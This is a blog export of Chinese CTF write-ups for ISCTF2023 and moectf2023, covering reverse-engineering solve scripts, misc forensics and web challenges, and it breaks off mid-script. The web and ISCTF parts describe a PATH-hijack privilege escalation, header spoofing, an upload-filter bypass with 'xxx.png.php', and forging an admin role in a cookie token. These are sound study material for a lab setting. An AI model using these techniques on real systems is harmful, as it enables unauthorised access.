执行时在环境变量中先找到我们自己写的shell脚本，然后执行<br><img src="/mdimg/isctf2023/29.png"><br>checkgenshin执行 service ssh status 时会执行 我们写的 service</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h1><h3 id="babyRe"><a href="#babyRe" class="headerlink" title="babyRe"></a><strong>babyRe</strong></h3><p>简单数学</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>a =  <span class="hljs-number">292884018782106151080211087047278002613718113661882871562870811030932129300110050822187903340426820507419488984883216665816506575312384940488196435920320779296487709207011656728480651848786849994095965852212548311864730225380390740637527033103610408592664948012814290769567441038868614508362013860087396409860</span><br>b= <span class="hljs-number">21292789073160227295768319780997976991300923684414991432030077313041762314144710093780468352616448047534339208324518089727210764843655182515955359309813600286949887218916518346391288151954579692912105787780604137276300957046899460796651855983154616583709095921532639371311099659697834887064510351319531902433355833604752638757132129136704458119767279776712516825379722837005380965686817229771252693736534397063201880826010273930761767650438638395019411119979149337260776965247144705915951674697425506236801595477159432369862377378306461809669885764689526096087635635247658396780671976617716801660025870405374520076160</span><br>c= <span class="hljs-number">5203005542361323780340103662023144468501161788183930759975924790394097999367062944602228590598053194005601497154183700604614648980958953643596732510635460233363517206803267054976506058495592964781868943617992245808463957957161100800155936109928340808755112091651619258385206684038063600864669934451439637410568700470057362554045334836098013308228518175901113235436257998397401389511926288739759268080251377782356779624616546966237213737535252748926042086203600860251557074440685879354169866206490962331203234019516485700964227924668452181975961352914304357731769081382406940750260817547299552705287482926593175925396</span><br><br>n = b -a -<span class="hljs-number">1</span><br>e =<span class="hljs-number">65537</span><br>phi = n -a + <span class="hljs-number">1</span><br>d= gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#ISCTF&#123;kisl-iopa-qdnc-tbfs-ualv&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023 wp</title>
    <link href="/2023/10/16/moectf2023/"/>
    <url>/2023/10/16/moectf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h3 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h3><p><img src="/mdimg/moectf2023/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">s, key, Len_k</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        s[i] = i<br>        k[i] = key[i % Len_k]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span><br>        tmp = s[i]<br>        s[i] = s[j]<br>        s[j] = tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">Data, Len_D, key, Len_k</span>):<br>    s = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    rc4_init(s, key, Len_k)<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    t = <span class="hljs-number">0</span><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Len_D):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        tmp = s[i]<br>        s[i] = s[j]<br>        s[j] = tmp<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        Data[k] = Data[k] ^ s[t]<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">&quot;moectf2023&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    key_len = <span class="hljs-built_in">len</span>(key)<br><br>    data = <span class="hljs-built_in">bytearray</span>([<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xBA</span>,<br>                      <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2E</span>,<br>                      <span class="hljs-number">0x50</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xAE</span>,<br>                      <span class="hljs-number">0x03</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>])<br><br>    rc4_crypt(data, <span class="hljs-built_in">len</span>(data), key, key_len)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><span class="hljs-comment">#moectf&#123;y0u_r3a11y_understand_rc4!!!!&#125;</span><br><br></code></pre></td></tr></table></figure><h3 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h3><p><img src="/mdimg/moectf2023/2.png"><br>base64换表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&quot;</span><br>string1 = <span class="hljs-string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br></code></pre></td></tr></table></figure><h3 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">0x54</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x60</span>,<br>        <span class="hljs-number">0x56</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x66</span>,<br>        <span class="hljs-number">0x51</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x61</span>,<br>        <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x44</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x39</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="ANDROIFD"><a href="#ANDROIFD" class="headerlink" title="ANDROIFD"></a>ANDROIFD</h3><p><img src="/mdimg/moectf2023/3.png"><br><img src="/mdimg/moectf2023/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">25</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">27</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">11</span>, <span class="hljs-number">29</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;\f&#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">28</span>, <span class="hljs-number">21</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">16</span>]<br>a=[]<br>key=<span class="hljs-string">&#x27;themoekey&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(i,<span class="hljs-built_in">int</span>):<br>        a.append(i)<br>    <span class="hljs-keyword">else</span>:<br>        a.append(<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-comment">#print(a)</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[x]^<span class="hljs-built_in">ord</span>(key[x%<span class="hljs-built_in">len</span>(key)])),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="UPX！"><a href="#UPX！" class="headerlink" title="UPX！"></a>UPX！</h3><p><img src="/mdimg/moectf2023/5.png"><br>UPX脱壳<br><img src="/mdimg/moectf2023/6.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">enc =[<span class="hljs-number">10</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">4</span>,  <span class="hljs-number">19</span>,   <span class="hljs-number">1</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">15</span>,  <span class="hljs-number">56</span>, <span class="hljs-number">30</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">44</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">19</span>,   <span class="hljs-number">8</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">53</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">17</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">21</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">50</span>,  <span class="hljs-number">55</span>,  <span class="hljs-number">63</span>,  <span class="hljs-number">70</span>,  <span class="hljs-number">70</span>,  <span class="hljs-number">70</span>, <span class="hljs-number">26</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x67</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="weird-package"><a href="#weird-package" class="headerlink" title="weird_package"></a>weird_package</h3><p>bandzip修复文件<br><img src="/mdimg/moectf2023/7.png"><br>或者7z直接打开压缩包<br>9999是真flag<br><img src="/mdimg/moectf2023/8.png"></p><h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h3><p>exif<br><img src="/mdimg/moectf2023/9.png"><br><img src="/mdimg/moectf2023/10.png"></p><h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h3><p>改png文件头<br><img src="/mdimg/moectf2023/11.png"></p><h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h3><p><img src="/mdimg/moectf2023/12.png"></p><h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h3><p><img src="/mdimg/moectf2023/13.png"></p><h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h3><p>随波逐流得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">这是你的flag：<br><br>a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262<br><br>但是flag用AES加密了，key是下面这行字的sha256（<span class="hljs-built_in">hash</span>值的开头是b34edc782d68fda34dc23329）<br><br>所以说，codepage真的很重要啊（<br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/14.png"></p><h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h3><p>zsteg嗦<br><img src="/mdimg/moectf2023/15.png"></p><h3 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a>base乐队</h3><p>basecrack 然后栅栏4 然后base64</p><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>word，ppt都是压缩包<br>改ppt后缀打开<br>ctrl+a<img src="/mdimg/moectf2023/16.png"><br>第三页图片移开看注释<br>第四页移开图片<br>最后一页拖动文本框可以看见</p><h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h3><p><code>**moectf&#123;jiashi_baisheng_huijin&#125;**</code></p><h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a>狗子(3) 寝室</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> rarfile<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> py7zr<br><br>a=<span class="hljs-number">9999</span><br><span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:<br>  zipname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.zip&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(zipname)):<br>    zfile=zipfile.ZipFile(zipname)<br>    zfile.extractall()<br>    zfile.close()<br>    a-=<span class="hljs-number">1</span><br>  rarname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.rar&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(rarname)):<br>    rfile=rarfile.RarFile(rarname)<br>    rfile.extractall()<br>    rfile.close()<br>    a-=<span class="hljs-number">1</span><br>  tarname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.tar.gz&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(tarname)):<br>    rfile=tarfile.<span class="hljs-built_in">open</span>(tarname)<br>    rfile.extractall()<br>    rfile.close()<br>    a-=<span class="hljs-number">1</span><br>  zname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.7z&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(zname)):<br>    file=py7zr.SevenZipFile(zname)<br>    file.extractall()<br>    file.close()<br>    a-=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="你想要flag吗"><a href="#你想要flag吗" class="headerlink" title="你想要flag吗"></a>你想要flag吗</h3><p><img src="/mdimg/moectf2023/17.jpg"><br><img src="/mdimg/moectf2023/18.png"><br><strong>rabbit解密</strong></p><h3 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h3><p>分离图片，b神的工具盲水印提取<br><img src="/mdimg/moectf2023/19.png"></p><h3 id="狗子-4-故乡话"><a href="#狗子-4-故乡话" class="headerlink" title="狗子(4) 故乡话"></a>狗子(4) 故乡话</h3><p><img src="/mdimg/moectf2023/20.png"><br><img src="/mdimg/moectf2023/21.png"></p><h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a>尊嘟假嘟？</h3><p><a href="https://zdjd.vercel.app/">https://zdjd.vercel.app/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher: rY5Ah8BtsYYatLEPu8YCPU22Gr5PQt8YGDKkvb4bk3D4JJeEe5kgCpoEqgRzsM7m9d8jEtE3LUoKpULQnMcuAunU1gtpzC5kSUxFctFTNCMZVHLHZNCo5akzKMRY5bbyBP7RNUeGDEYoUc<br>key: the tailing <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span> of <span class="hljs-built_in">hash</span> of <span class="hljs-string">&quot;zundujiadu?&quot;</span> which begin <span class="hljs-keyword">with</span> b6091904cdfb        <br>iv: the end <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span> of <span class="hljs-built_in">hash</span> of <span class="hljs-string">&quot;dududu?&quot;</span> which begin <span class="hljs-keyword">with</span> 272bf1da2207                <br><br>hint1: how do Bitcoin addresses encode?<br>hint2: the name of cryptosystem <span class="hljs-keyword">is</span> <span class="hljs-string">&quot;bl****sh&quot;</span><br></code></pre></td></tr></table></figure><p>key和iv是sha256<br><img src="/mdimg/moectf2023/22.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p><img src="/mdimg/moectf2023/23.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload:<br>GET:UwU=u<br>POST:Luv=u<br>cookie:character=admin<br>x-forwarded-<span class="hljs-keyword">for</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>User-Agent: MoeBrowser<br></code></pre></td></tr></table></figure><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>url=<span class="hljs-string">&#x27;http://localhost:58049/&#x27;</span><br>session=requests.Session()<br>fx = <span class="hljs-number">0</span><br>sd = <span class="hljs-number">0</span><br>data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;steering_control&quot;</span>:fx,<span class="hljs-string">&quot;throttle&quot;</span>:sd&#125;<br>re=session.post(url=url,data=data)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;向左&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;向右&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;弯道直行&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;抓地力太小了&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;抓地力太大了&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;保持这个速度&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">1</span><br>    soup = BeautifulSoup(re.content, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>    info_div = soup.find(<span class="hljs-string">&quot;div&quot;</span>, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;info&quot;</span>&#125;)<br>    <span class="hljs-built_in">print</span>(info_div.text)<br>    data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;steering_control&quot;</span>:fx,<span class="hljs-string">&quot;throttle&quot;</span>:sd&#125;<br>    re=session.post(url=url,data=data)<br>    <span class="hljs-built_in">print</span>(data)<br>    <br></code></pre></td></tr></table></figure><h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p><img src="/mdimg/moectf2023/24.png"><br>只检测文件后缀第一个点后面的，xxx.png.php就行</p><h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p><img src="/mdimg/moectf2023/25.png"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>注册一个新账号然后登录得到token<br><img src="/mdimg/moectf2023/26.png"><br>base64decode之后把role：user<br>改成admin,base64encode上传即可</p><h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><p><img src="/mdimg/moectf2023/27.png"><br>bp爆破<br><img src="/mdimg/moectf2023/28.png"></p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;localhost:52776&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;multipart/form-data; boundary=---------------------------15719226131077920622631907538&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    